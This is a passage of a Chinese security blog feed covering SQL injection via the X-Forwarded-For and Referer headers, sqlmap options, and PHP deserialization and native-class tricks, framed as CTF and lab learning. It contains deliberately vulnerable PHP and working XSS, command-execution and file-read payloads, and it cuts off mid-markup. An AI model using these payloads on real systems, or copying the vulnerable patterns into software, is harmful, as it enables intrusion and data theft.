class="headerlink" title="3、XFF 注入"></a>3、XFF 注入</h3><p>核心代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>))&#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>))&#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>))&#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$HTTP_SERVER_VARS</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里没有在本地复现成功，因为超时了，可以去现成的靶场看看，做一做 ctf 题来加深一下印象。</p><p>利用方式：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>1&#x27; and 1=1--+</span><br></pre></td></tr></table></figure><p>接下来的步骤这里不再赘述。</p><h3 id="4、Referer-注入"><a href="#4、Referer-注入" class="headerlink" title="4、Referer 注入"></a>4、Referer 注入</h3><p>核心代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br></pre></td></tr></table></figure><p>利用方式：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>1&#x27; and 1=1-- -</span><br></pre></td></tr></table></figure><br><h2 id="十、SQLMap-的使用"><a href="#十、SQLMap-的使用" class="headerlink" title="十、SQLMap 的使用"></a>十、SQLMap 的使用</h2><p>sqlmap 是一款基于python编写的渗透测试工具，在sql检测和利用方面功能强大，支持多种数据库。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">-u 指定目标URL (可以是http协议也可以是https协议)</span><br><span class="line"> </span><br><span class="line">-d 连接数据库</span><br><span class="line"> </span><br><span class="line">--dbs 列出所有的数据库</span><br><span class="line"> </span><br><span class="line">--current-db 列出当前数据库</span><br><span class="line"> </span><br><span class="line">--tables 列出当前的表</span><br><span class="line"> </span><br><span class="line">--columns 列出当前的列</span><br><span class="line"> </span><br><span class="line">-D 选择使用哪个数据库</span><br><span class="line"> </span><br><span class="line">-T 选择使用哪个表</span><br><span class="line"> </span><br><span class="line">-C 选择使用哪个列</span><br><span class="line"> </span><br><span class="line">--dump 获取字段中的数据</span><br><span class="line"> </span><br><span class="line">--batch 自动选择yes</span><br><span class="line"> </span><br><span class="line">--smart 启发式快速判断，节约浪费时间</span><br><span class="line"> </span><br><span class="line">--forms 尝试使用post注入</span><br><span class="line"> </span><br><span class="line">-r 加载文件中的HTTP请求（本地保存的请求包txt文件）</span><br><span class="line"> </span><br><span class="line">-l 加载文件中的HTTP请求（本地保存的请求包日志文件）</span><br><span class="line"> </span><br><span class="line">-g 自动获取Google搜索的前一百个结果，对有GET参数的URL测试</span><br><span class="line"> </span><br><span class="line">-o 开启所有默认性能优化</span><br><span class="line"> </span><br><span class="line">--tamper 调用脚本进行注入</span><br><span class="line"> </span><br><span class="line">-v 指定sqlmap的回显等级</span><br><span class="line"> </span><br><span class="line">--delay 设置多久访问一次</span><br><span class="line"> </span><br><span class="line">--os-shell 获取主机shell，一般不太好用，因为没权限</span><br><span class="line"> </span><br><span class="line">-m 批量操作</span><br><span class="line"> </span><br><span class="line">-c 指定配置文件，会按照该配置文件执行动作</span><br><span class="line"> </span><br><span class="line">-data data指定的数据会当做post数据提交</span><br><span class="line"> </span><br><span class="line">-timeout 设定超时时间</span><br><span class="line"> </span><br><span class="line">--level 设置注入探测等级</span><br><span class="line"> </span><br><span class="line">--risk 风险等级</span><br><span class="line"> </span><br><span class="line">--identify-waf 检测防火墙类型</span><br><span class="line"> </span><br><span class="line">--param-del=&quot;分割符&quot; 设置参数的分割符</span><br><span class="line"> </span><br><span class="line">--skip-urlencode 不进行url编码</span><br><span class="line"> </span><br><span class="line">--keep-alive 设置持久连接，加快探测速度</span><br><span class="line"> </span><br><span class="line">--null-connection 检索没有body响应的内容，多用于盲注</span><br><span class="line"> </span><br><span class="line">--thread 最大为10 设置多线程</span><br></pre></td></tr></table></figure><br><h2 id="十一、绕-WAF"><a href="#十一、绕-WAF" class="headerlink" title="十一、绕 WAF"></a>十一、绕 WAF</h2><p>绕 waf 的有点多，可以先去刷题日志看看，这里后续会给出文章。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;SQL注入&lt;/p&gt;</summary>
    
    
    
    <category term="Web漏洞" scheme="http://blog.hvvl404.fun/categories/Web%E6%BC%8F%E6%B4%9E/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP反序列化</title>
    <link href="http://blog.hvvl404.fun/2023/05/08/Web%E6%BC%8F%E6%B4%9E/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://blog.hvvl404.fun/2023/05/08/Web%E6%BC%8F%E6%B4%9E/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2023-05-08T14:15:02.390Z</published>
    <updated>2023-05-18T14:19:24.872Z</updated>
    
    <content type="html"><![CDATA[<p>PHP反序列化</p><span id="more"></span><h2 id="一、常规反序列化"><a href="#一、常规反序列化" class="headerlink" title="一、常规反序列化"></a>一、常规反序列化</h2><p>PHP反序列化漏洞，又叫php对象注入漏洞，是一种常见的漏洞，在我们进行代码审计以及CTF中经常能够遇到。它的成因在于代码中的 unserialize() 接收的参数可控。当传给 unserialize() 的参数可控时，我们可以通过传入一个“精心”构造的序列化字符串，从而控制对象内部的变量甚至是函数。</p><p>防范PHP反序列化漏洞的一个好的预防措施就是不要把用户的输入或者是用户可控的参数直接放进反序列化的操作中去。漏洞的形成的根本原因是程序没有对用户输入的反序列化字符串进行检测，导致反序列化过程可以被恶意控制，进而造成代码执行、getshell等一系列不可控的后果。</p><h3 id="1、简单的序列化例子："><a href="#1、简单的序列化例子：" class="headerlink" title="1、简单的序列化例子："></a>1、简单的序列化例子：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctf</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;flag = <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// O:3:&quot;ctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:4:&quot;flag&quot;;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="2、简单的反序列化例子："><a href="#2、简单的反序列化例子：" class="headerlink" title="2、简单的反序列化例子："></a>2、简单的反序列化例子：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctf</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;flag = <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>-&gt;flag;</span><br><span class="line"></span><br><span class="line"><span class="comment">// flag</span></span><br></pre></td></tr></table></figure><h3 id="3、一些常见的魔术方法："><a href="#3、一些常见的魔术方法：" class="headerlink" title="3、一些常见的魔术方法："></a>3、一些常见的魔术方法：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__construct：序列化的时候调用</span><br><span class="line">__destruct：序列化结束时被调用</span><br><span class="line">__wakeup：也是结束时调用，但是在__destruct先执行</span><br><span class="line">__call：当调用不存在的函数时会调用__call方法</span><br><span class="line">__toString：当一个类被当作字符串使用的时候会被当用</span><br><span class="line">__invoke：当一个类被当作函数调用的时候会被调用</span><br><span class="line">__get：当调用不存在的属性时会被调用</span><br><span class="line">__set ：当给一个私有属性赋值的时候会被调用</span><br><span class="line">__sleep：当序列化时被调用，在__construct之后</span><br><span class="line"></span><br><span class="line">php&gt;=php7.<span class="number">4</span></span><br><span class="line">__serialize：当序列化时被调用，在__construct之后；当他和__sleep同时存在时，会忽略__sleep方法，执行__serialize</span><br><span class="line">__unserialize：当反序列化时被调用，在__destruct之前；当他和__wakeup同时存在时，会忽略__wakeup方法，执行__unserialize</span><br><span class="line"><span class="comment">// 当__serialize方法存在时，参数为__serialize的返回数组；当__serialize方法不存在时，参数为实例对象的所有属性值组合而成的数组</span></span><br></pre></td></tr></table></figure><p>常见的题型：寻址绕过、大小写绕过、绕过__wakeup、编码绕过等。可以去看看我的<a href="">刷题日志</a>。这里就不做赘述。</p><br><h2 id="二、原生类反序列化"><a href="#二、原生类反序列化" class="headerlink" title="二、原生类反序列化"></a>二、原生类反序列化</h2><p>原生类反序列化其实就是原生类在实际情况中的应用，原生类的文章可以参考<a href="https://ch1e.gitee.io/2021/11/12/yuanshenglei/">ch1e</a>这位大佬的，总结的还是很到位的。</p><h3 id="1、代码执行类"><a href="#1、代码执行类" class="headerlink" title="1、代码执行类"></a>1、代码执行类</h3><h4 id="（1）报错类"><a href="#（1）报错类" class="headerlink" title="（1）报错类"></a>（1）报错类</h4><h5 id="lt-1-gt-Error"><a href="#lt-1-gt-Error" class="headerlink" title="&lt;1&gt; Error"></a>&lt;1&gt; Error</h5><p>在 PHP7 版本中，因为Error中带有 toString 方法，该方法会将传入给 toString 的参数原封不动的输出到浏览器。在这么一个过程中可能会产生 XSS。</p><p>给出测试的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$a</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p><img src="/images/Web%E6%BC%8F%E6%B4%9E/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-5.png" alt="PHP反序列化-5"></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=ERROR&amp;b=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/Web%E6%BC%8F%E6%B4%9E/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-6.png" alt="PHP反序列化-5"></p><p>那么我们将代码改一下，改为如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$a</span>(<span class="subst">$b</span>);&quot;</span>);</span><br></pre></td></tr></table></figure><p>加上了 eval 函数，我们就可以执行系统命令了。</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=ERROR&amp;b=system(&quot;ipconfig&quot;)</span><br></pre></td></tr></table></figure><p><img src="/images/Web%E6%BC%8F%E6%B4%9E/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-7.png" alt="PHP反序列化-7"></p><p>这是因为 <code>echo new $a($b);</code> 这段代码他会输出 <code>system(&quot;ipconfig&quot;)</code> ，那么加一个 eval 函数就回去执行这条命令了，也就是 RCE。</p><h5 id="lt-2-gt-Exception"><a href="#lt-2-gt-Exception" class="headerlink" title="&lt;2&gt; Exception"></a>&lt;2&gt; Exception</h5><p>Exception 跟 Error 是一样的，他也是自带 tostring 方法，当然也是可以 XSS 和 RCE 的。</p><p><img src="/images/Web%E6%BC%8F%E6%B4%9E/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-8.png" alt="PHP反序列化-8"></p><p><img src="/images/Web%E6%BC%8F%E6%B4%9E/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-9.png" alt="PHP反序列化-9"></p><h4 id="（2）反射类"><a href="#（2）反射类" class="headerlink" title="（2）反射类"></a>（2）反射类</h4><h5 id="lt-1-gt-ReflectionClass"><a href="#lt-1-gt-ReflectionClass" class="headerlink" title="&lt;1&gt; ReflectionClass"></a>&lt;1&gt; ReflectionClass</h5><p>ReflectionClass 反射类在 PHP5 新加入，继承自Reflector，它可以与已定义的类建立映射关系，通过反射类可以对类操作</p><p>反射类不仅仅可以建立对类的映射，也可以<strong>建立对PHP基本方法的映射</strong>，并且返回基本方法执行的情况。因此可以通过建立反射类 <code>new ReflectionClass(system(&#39;cmd&#39;))</code> 来执行命令。</p><p>把他放在这里是因为他跟报错类的比较像，都可以进行 RCE ，不同的就是 php 内部执行方式不一样，还有就是反射类的不能 XSS。</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$a</span>(<span class="subst">$b</span>);&quot;</span>);</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=ReflectionClass&amp;b=system(&quot;ipconfig&quot;)</span><br></pre></td></tr></table></figure><p><img src="/images/Web%E6%BC%8F%E6%B4%9E/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-10.png" alt="PHP反序列化-10"></p><h5 id="lt-2-gt-ReflectionMethod"><a href="#lt-2-gt-ReflectionMethod" class="headerlink" title="&lt;2&gt; ReflectionMethod"></a>&lt;2&gt; ReflectionMethod</h5><p>ReflectionMethod 跟 ReflectionClass 是一样的，如图：</p><p><img src="/images/Web%E6%BC%8F%E6%B4%9E/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-10.png" alt="PHP反序列化-10"></p><h4 id="（3）文件处理类"><a href="#（3）文件处理类" class="headerlink" title="（3）文件处理类"></a>（3）文件处理类</h4><h5 id="lt-1-gt-SplFileInfo"><a href="#lt-1-gt-SplFileInfo" class="headerlink" title="&lt;1&gt; SplFileInfo"></a>&lt;1&gt; SplFileInfo</h5><p>SplFileInfo 用来获取文件详细信息，无意间发现的一个也可以调用 tostring 的类。与报错类相似，也是可以 XSS 和 RCE。</p><p>之所以归为文件处理类是因为他与 SplFileObject 一样，都是对文件进行操作，都给文件提供了面向对象的接口，只是作用不一样而已。</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=SplFileinfo&amp;b=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/Web%E6%BC%8F%E6%B4%9E/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-18.png" alt="PHP反序列化-18"></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=SplFileinfo&amp;b=system(&quot;ipconfig&quot;)</span><br></pre></td></tr></table></figure><p><img src="/images/Web%E6%BC%8F%E6%B4%9E/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-19.png" alt="PHP反序列化-19"></p><h5 id="lt-2-gt-SplTempFileObject"><a href="#lt-2-gt-SplTempFileObject" class="headerlink" title="&lt;2&gt; SplTempFileObject"></a>&lt;2&gt; SplTempFileObject</h5><p>SplTempFileObject 临时文件提供面向对象的接口。这是官方的一个解释，这个也是无意中发现的，但是这个类没有 XSS，只有 RCE。</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=SplTempFileObject&amp;b=system(&quot;ipconfig&quot;)</span><br></pre></td></tr></table></figure><p><img src="/images/Web%E6%BC%8F%E6%B4%9E/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-20.png" alt="PHP反序列化-20"></p><h3 id="2、遍历目录类"><a href="#2、遍历目录类" class="headerlink" title="2、遍历目录类"></a>2、遍历目录类</h3><h5 id="lt-1-gt-DirectoryIterator"><a href="#lt-1-gt-DirectoryIterator" class="headerlink" title="&lt;1&gt; DirectoryIterator"></a>&lt;1&gt; DirectoryIterator</h5><p>DirectoryIterator 类中有一个__construct()方法，他会构造一个迭代器，如果使用echo进行输出，他会返回迭代器的第一个。</p><p>需要用 <code>glob://</code> 协议才可以访问到，<code>glob://</code> 协议是 php5.3.0 以后一种查找匹配的文件路径模式。如果单纯输入一个点（当前路径），什么都不会显示出来，因为 DirectoryIterator 需要搭配 <code>glob://</code> 协议使用。</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$a</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=FilesystemIterator&amp;b=glob://f*</span><br></pre></td></tr></table></figure><p><img src="/images/Web%E6%BC%8F%E6%B4%9E/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-12.png" alt="PHP反序列化-12"></p><p>可以看到他只会返回一个，由于我用到了通配符 <code>*</code> ，所以才会返回 flag，那么在实战中我们该如何去找我们想要的文件呢？除了通配符，我们还可以利用正则去找寻我们想要的文件。</p><p>假设我们不知道第二个字母是什么，我们就可以用 <code>[a-z]</code> 来帮我们匹配查找。</p><p><img src="/images/Web%E6%BC%8F%E6%B4%9E/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-14.png" alt="PHP反序列化-14"></p><h5 id="lt-2-gt-FilesystemIterator"><a href="#lt-2-gt-FilesystemIterator" class="headerlink" title="&lt;2&gt; FilesystemIterator"></a>&lt;2&gt; FilesystemIterator</h5><p>FilesystemIterator 同 DirectoryIterator 是一样的，这里就不再赘述。</p><p><img src="/images/Web%E6%BC%8F%E6%B4%9E/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-13.png" alt="PHP反序列化-13"></p><h5 id="lt-3-gt-GlobIterator"><a href="#lt-3-gt-GlobIterator" class="headerlink" title="&lt;3&gt; GlobIterator"></a>&lt;3&gt; GlobIterator</h5><p>GlobIterator 和另外两个类差不多，不过 glob 是 GlobIterator 类本身自带的，因此在遍历的时候，就不需要带上 glob 协议头了，只需要后面的相关内容。</p><p><img src="/images/Web%E6%BC%8F%E6%B4%9E/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-15.png" alt="PHP反序列化-15"></p><h3 id="3、读取文件类"><a href="#3、读取文件类" class="headerlink" title="3、读取文件类"></a>3、读取文件类</h3><h5 id="lt-1-gt-SplFileObject"><a href="#lt-1-gt-SplFileObject" class="headerlink" title="&lt;1&gt; SplFileObject"></a>&lt;1&gt; SplFileObject</h5><p>SplFileObject 类为文件提供了一个面向对象接口，也就是这个类可以用来读文件。</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$a</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=SplFileObject&amp;b=flag</span><br></pre></td></tr></table></figure><p><img src="/images/Web%E6%BC%8F%E6%B4%9E/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-16.png" alt="PHP反序列化-16"></p><p>但是直接读取文件的话有局限性，他只会读取一行，我们可以利用伪协议 <code>php://filter</code> 来实现读取文件</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=SplFileObject&amp;b=php://filter/read/resource=flag</span><br></pre></td></tr></table></figure><p><img src="/images/Web%E6%BC%8F%E6%B4%9E/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-17.png" alt="PHP反序列化-17"></p><br><h2 id="三、字符串逃逸"><a href="#三、字符串逃逸" class="headerlink" title="三、字符串逃逸"></a>三、字符串逃逸</h2><h3 id="1、扩张"><a href="#1、扩张" class="headerlink" title="1、扩张"></a>1、扩张</h3><p>通俗来说，就是他会有一个替换的函数，把你输入的替换成他要求的，一般会多出来一个，然后依旧可以利用逃出来的字符构造你想要改变的值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;bb&#x27;</span>, <span class="string">&#x27;ccc&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;aaaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$AA</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$AA</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$AA</span>));</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>-&gt;pass;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 结果如下： </span></span><br><span class="line"><span class="comment">// O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;aaaa&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;</span></span><br><span class="line"><span class="comment">// 123456</span></span><br></pre></td></tr></table></figure><p>可以看到上面序列化的结果是以 <code>&quot;;&#125;</code> 结尾的，然后思考，我们传入的 <code>bb</code> 会被替换成 <code>ccc</code> ，修改一下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span 